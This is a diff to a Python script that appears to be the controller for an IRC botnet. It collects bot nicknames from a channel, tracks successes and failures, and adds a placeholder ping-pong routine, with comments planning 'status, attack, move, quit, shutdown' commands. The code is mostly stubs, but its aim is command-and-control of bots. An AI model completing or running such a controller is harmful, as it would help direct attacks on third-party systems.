@@ -17,6 +17,9 @@ botList = []
 botSuccess = []
 botFails = []
 
+# PingPong protocol
+def pingPong():
+    pass 
 
 # Get response from Bot 
 def getResponse():
@@ -28,6 +31,7 @@ def getResponse():
         return False
 
 # COMMANDS
+
 # Get bot status
 def botStatus():
     # Get bot Nickname and how many there are
@@ -38,7 +42,7 @@ def botStatus():
         msgLines = msg.split("\n")
         # Get bot names from split lines
         for x in msgLines:
-            if x.startswith(":IRCBOT"):
+            if x.startswith(":SLAVE_PLEB"):
                 botName = x[x.find(":", 1) + 1:].strip()
                 botList.append(botName)
         botNames = "\n".join(botList)
@@ -85,6 +89,13 @@ def botHandler():
         # Gotta do the readable thing here
         readable, writable, exceptable = select.select([IRCSOCKET, sys.stdin],[sys.stdout],[])
         for x in readable:
+            # Start parsing data 
+
+            # If data starts with PONG, send PING 
+            pingPong() 
+
+            # elif data in command 
+            # status, attack, move, quit, shutdown 
 
 
 # CONNECT TO IRC SERVER CHANNEL
@@ -124,5 +135,8 @@ if __name == "__main__":
     while True:
         connectStatus = serverConnect(HOST, PORT)
         if connectStatus == True:
+            # Send initial PING? 
+            pingPong()
+
             # Start giving commands to bot
             botHandler()
